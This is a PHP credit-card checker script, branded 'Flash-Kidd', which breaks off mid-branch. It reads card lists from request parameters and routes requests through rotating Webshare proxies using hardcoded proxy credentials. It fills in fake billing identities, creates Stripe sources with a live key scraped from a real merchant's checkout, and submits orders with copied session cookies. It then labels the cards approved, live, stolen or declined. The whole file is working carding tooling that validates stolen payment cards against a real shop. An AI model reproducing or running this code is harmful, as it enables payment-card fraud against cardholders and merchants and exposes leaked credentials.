<?php

#---------------------------------------------------------------------------------------------------------------------------------#
#---------------------------------------------------[MADE BY 𝑫𝑹𝑨𝑮𝑶𝑵#𝑴𝑨𝑺𝑻𝑬𝑹]----------------------------------------------------#
#---------------------------------------------------------------------------------------------------------------------------------#
 

require 'function.php';

error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\:\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];
/////////////////////==============[Init Proxy Section]===============//////////////////////////////
///////////////////////////===[Webshare proxys for cc checker]===////////////////////////////////////
$Websharegay = rand(0,250);
$rp1 = array(
  1 => 'alcxvgti-rotate:fgcj6am715nv',
2 => 'fgsskgsw-rotate:zdp4kp9iavr8',
    ); 
    $rotate = $rp1[array_rand($rp1)];
//////////////////////////==============[Proxy Section]===============//////////////////////////////
$ch = curl_init('https://api.ipify.org/');
curl_setopt_array($ch, [
CURLOPT_RETURNTRANSFER => true,
CURLOPT_PROXY => 'http://p.webshare.io:80',
CURLOPT_PROXYUSERPWD => $rotate,
CURLOPT_HTTPGET => true,
]);
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();  
if (isset($ip1)){
$ip = "Live! ✅";
}
if (empty($ip1)){
$ip = "Dead![".$rotate."] ❌";
}
echo '[ IP: '.$ip.' ] ';
///////////////////////==============[End Proxy Section]===============//////////////////////////////#-------------------
////////////////////////////===[1ST CURL]
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/payment_methods',
'scheme: https',
'accept: application/json',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]='.$name.'+'.$last.'&owner[address][line1]='.$street.'&owner[address][state]='.$state.'&owner[address][city]='.$city.'&owner[address][postal_code]='.$postcode.'&owner[address][country]=US&owner[email]='.$email.'&owner[phone]='.$phone.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=22548fec-1bbd-48dd-9888-2505f188fcfff19c0b&muid=c1b7c804-866e-4760-ae13-673dcadfca39a6de66&sid=217d4c39-3b3b-487b-8c87-a147a934c057f265f1&pasted_fields=number&payment_user_agent=stripe.js%2F479e2c4b0%3B+stripe-js-v3%2F479e2c4b0&time_on_page=94454&referrer=https%3A%2F%2Fwww.thethriveplanner.com%2F&key=pk_live_dWiOzaEyKHblNr3LfTitEjNv');



$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));

# -------------------- [2 REQ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.thethriveplanner.com/?wc-ajax=checkout');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
#'authority: ',
#'method: POST',
#'path: ',
#'scheme: https',
'accept: application/json, text/javascript, */*; q=0.01',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'cookie: wp_woocommerce_session_f6f83505bda22992dcbfd7b259b4e18b=9a9bf2151c0953c2a35ce3a66c94828d%7C%7C1617473960%7C%7C1617470360%7C%7C2663f9493d1539513526bb6e86dcc7c7; woocommerce_items_in_cart=1; cartflows_session_8842=8842_7e2417314b63c1b9b29aebcd66816040; woocommerce_cart_hash=b49597ffdfec164bc5a1edf65d5e0bcb; wcf-visited-flow-8842=%5B8919%5D; wcf-step-visited-8842=%7B%228919%22%3A%7B%22control_step_id%22%3A8919%2C%22current_step_id%22%3A8919%2C%22step_type%22%3A%22checkout%22%2C%22visit_id%22%3A32826%2C%22conversion%22%3A%22no%22%7D%7D; _ga=GA1.2.756652108.1617301166; _gid=GA1.2.1032896344.1617301166; _fbp=fb.1.1617301166541.1509554434; tk_ai=F3BEIFDd5ilERxcW2Bj4%2FGKo; tk_qs=; __stripe_mid=c1b7c804-866e-4760-ae13-673dcadfca39a6de66; __stripe_sid=217d4c39-3b3b-487b-8c87-a147a934c057f265f1; mailchimp.cart.current_email=thekiddwithplug@gmail.com; mailchimp.cart.previous_email=thekiddwithplug@gmail.com; mailchimp_user_email=thekiddwithplug%40gmail.com',
'Host: www.thethriveplanner.com',
'origin: https://www.thethriveplanner.com',
'referer: https://www.thethriveplanner.com/checkout-now/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36',
'x-requested-with: XMLHttpRequest',
   ));

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'billing_first_name=Monkey&billing_last_name=Luffy&billing_phone=2568695858&billing_email=thekiddwithplug%40gmail.com&billing_address_1=15+cliff+st&billing_address_2=&billing_city=New+York&billing_state=NY&billing_country=US&billing_postcode=10038&mailchimp_woocommerce_newsletter=1&shipping_first_name=&shipping_last_name=&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=FL&shipping_country=US&shipping_postcode=&_wcf_flow_id=8842&_wcf_checkout_id=8919&wcf-single-sel=80&wcf_qty_selection=1&wcf_qty_selection=1&wcf_qty_selection=1&shipping_method%5B0%5D=flat_rate%3A9&coupon_code=&payment_method=stripe&terms=on&terms-field=1&wcf_bump_product_id=8633&_wcf_bump_product=&woocommerce-process-checkout-nonce=f46c5b3e1c&_wp_http_referer=%2Fcheckout-now%2F%3Fwc-ajax%3Dupdate_order_review&_wcf_bump_product_action=&_wcf_bump_product=&stripe_source='.$id.'');


$result2 = curl_exec($ch);
$info = curl_getinfo($ch);
$time = $info['total_time'];

// this is for additional info - so result will look more good by adding the info of the bin

/////////// [Bin Lookup] /////////////

$ch = curl_init();
$bin = substr($cc, 0,6);
curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bindata = curl_exec($ch);
$binna = json_decode($bindata,true);
$brand = $binna['scheme'];
$country = $binna['country']['name'];
$type = $binna['type'];
$bank = $binna['bank']['name'];
curl_close($ch);


# ----------------------------------------------------------- [Responses] ------------------------------------------------------- #

# ------------------------------------------------- [CVV Responses ] ------------------------------------------------------------ #

if
(strpos($result2,  '"cvc_check": "pass"')) {
  echo '</br><span class="badge badge-success">🟢 APPROVED! 🟢</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">{MSG:- CVC MATCHED}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success">⚡️Flash-Kidd⚡️</span></br>';
} 

elseif
(strpos($result2,  "Thank You For Donation.")) {
    echo '</br><span class="badge badge-success">🟢 APPROVED! 🟢</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCV MATCHED {MSG:- Thank You For Donation.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success">⚡️Flash-Kidd⚡️</span></br>';
} 

elseif
(strpos($result2,  '"Thank You For Donation."')) {
    echo '</br><span class="badge badge-success">🟢 APPROVED! 🟢</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCV MATCHED {MSG:- Thank You For Donation.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success">⚡️Flash-Kidd⚡️</span></br>';
} 

elseif
(strpos($result2,  "Thank You.")) {
    echo '</br><span class="badge badge-success">🟢 APPROVED! 🟢</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCV MATCHED {MSG:- Thank You.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success">⚡️Flash-Kidd⚡️</span></br>';
} 

elseif
(strpos($result2,  'Your card zip code is incorrect.')) {
    echo '</br><span class="badge badge-success">🟢 APPROVED! 🟢</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCV MATCHED {MSG:- Your Card Zip Code Is Incorrect.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success">⚡️Flash-Kidd⚡️</span></br>';
} 

elseif
(strpos($result2,  '/donations/thank_you?donation_number=','')) {
    echo '</br><span class="badge badge-success">🟢 APPROVED! 🟢</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCV MATCHED {MSG:- Thank You For Donation. }</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success">⚡️Flash-Kidd⚡️</span></br>';
} 

elseif
(strpos($result2,  "incorrect_zip")) {
    echo '</br><span class="badge badge-success">🟢 APPROVED! 🟢</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCV MATCHED {MSG:- Incorrect Zip}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success">⚡️Flash-Kidd⚡️</span></br>';
} 


elseif
(strpos($result2,  '"type":"one-time"')) {
    echo '</br><span class="badge badge-success">🟢 APPROVED! 🟢</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">{MSG:- CCV MATCHED}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success">⚡️Flash-Kidd⚡️</span></br>';
} 

# -------------------------------------------------- [CVV Responses END ] ------------------------------------------------------ #


# ----------------------------------------------------- [CCN Responses ] ------------------------------------------------------ #

elseif
(strpos($result2,  'security code is incorrect.')) {
    echo '</br><span class="badge badge-success">🟢 Aprovada 🟢</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCN LIVE {MSG:- Security Code Is Incorrect.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success">⚡️Flash-Kidd⚡️</span></br>';
}

elseif
(strpos($result2,  'security code is invalid.')) {
    echo '</br><span class="badge badge-success">🟢 Aprovada 🟢</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCN LIVE {MSG:- Security Code Is Invalid.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success">⚡️Flash-Kidd⚡️</span></br>';
}

elseif
(strpos($result2,  "Your card's security code is incorrect.")) {
    echo '</br><span class="badge badge-success">🟢 Aprovada 🟢</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCN LIVE {MSG:- Your Card&#039;s Security Code Is Incorrect.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success">⚡️Flash-Kidd⚡️</span></br>';
  }

elseif
(strpos($result2,  "incorrect_cvc")) {
    echo '</br><span class="badge badge-success">🟢 Aprovada 🟢</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">CCN LIVE {MSG:- Incorrect CVC.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success">⚡️Flash-Kidd⚡️</span></br>';
}

#----------------------------------------------------- [CCN Responses END ]------------------------------------------------------ #



#--------------------------- [Stolen,Lost,Pickup,Insufficient Funds Responses]--------------------------------------------------- #

elseif
(strpos($result2,  "stolen_card")) {
    echo '</br><span class="badge badge-success">🟢 Aprovada 🟢</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">LIVE {MSG:- Stolen Card.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success">⚡️Flash-Kidd⚡️</span></br>';
}

elseif
(strpos($result2,  "lost_card")) {
    echo '</br><span class="badge badge-success">🟢 Aprovada 🟢</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">LIVE {MSG:- Lost Card.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success">⚡️Flash-Kidd⚡️</span></br>';
}

elseif
(strpos($result2,  'Your card has insufficient funds.')) {
    echo '</br><span class="badge badge-success">🟢 Aprovada 🟢</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">LIVE {MSG:- Your Card Has Insufficient Funds.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success">⚡️Flash-Kidd⚡️</span></br>';
}

elseif
(strpos($result2,  "pickup_card")) {
    echo '</br><span class="badge badge-success">🟢 Aprovada 🟢</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">LIVE {MSG:- Pickup Card.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success">⚡️Flash-Kidd⚡️</span></br>';
}

elseif
(strpos($result2,  "insufficient_funds")) {
    echo '</br><span class="badge badge-success">🟢 Aprovada 🟢</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">LIVE {MSG:- Insufficient Funds.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success">⚡️Flash-Kidd⚡️</span></br>';
}

elseif
(strpos($result2,  '"cvc_check": "fail"')) {
    echo '</br><span class="badge badge-success">🟢 Aprovada 🟢</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">LIVE {MSG:- CVC FAILED.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success">⚡️Flash-Kidd⚡️</span></br>';
}

elseif
(strpos($result2,  'security code is invalid.')) {
    echo '</br><span class="badge badge-success">🟢 Aprovada 🟢</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> |  <span class="badge badge-warning">LIVE {MSG:- Security Code Is Invalid.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success">⚡️Flash-Kidd⚡️</span></br>';
}

# -------------------------------------------------- [Stolen,Lost,Pickup,Insufficient Funds Responses END ] --------------------- #



# --------------------------------------------------- [Reprovada,Decline Responses ] -------------------------------------------- #

elseif
(strpos($result2,  'Your card has expired.')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Expired Card</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success">⚡️Flash-Kidd⚡️</span></br>';
  } 

elseif
(strpos($result2,  'Your card number is incorrect.')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Your Card Number Is Incorrect.</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success">⚡️Flash-Kidd⚡️</span></br>';
  } 

elseif
(strpos($result2,  "incorrect_number")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Your Card Number Is Incorrect.</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success">⚡️Flash-Kidd⚡️</span></br>';
  } 

elseif
(strpos($result2,  'card was declined.')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Card Was Declined</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success">⚡️Flash-Kidd⚡️</span></br>';
  } 

elseif
(strpos($result2,  "generic_decline")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Generic Decline</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success">⚡️Flash-Kidd⚡️</span></br>';
  } 

elseif
(strpos($result2,  "do_not_honor")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Do Not Honor The Card</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success">⚡️Flash-Kidd⚡️</span></br>';
  } 


elseif
(strpos($result2,  "expired_card")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Expired Card</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success">⚡️Flash-Kidd⚡️</span></br>';
  } 

elseif
(strpos($result2,  'Your card does not support this type of purchase.')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Your Card Does Not Support This Type Of Purchase.</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success">⚡️Flash-Kidd⚡️</span></br>';
  } 

elseif
(strpos($result2,  "processing_error")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Processing Error</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success">⚡️Flash-Kidd⚡️</span></br>';
  } 

elseif
(strpos($result2, "service_not_allowed")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Service Not Allowed</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success">⚡️Flash-Kidd⚡️</span></br>';
  } 

elseif
(strpos($result2,  '"cvc_check": "unchecked"')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: CVC Unchecked</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success">⚡️Flash-Kidd⚡️</span></br>';
  } 

elseif
(strpos($result2,  '"cvc_check": "unavailable"')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: CVC Unavailable </span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success">⚡️Flash-Kidd⚡️</span></br>';
  } 

elseif
(strpos($result2,  "parameter_invalid_empty")) {
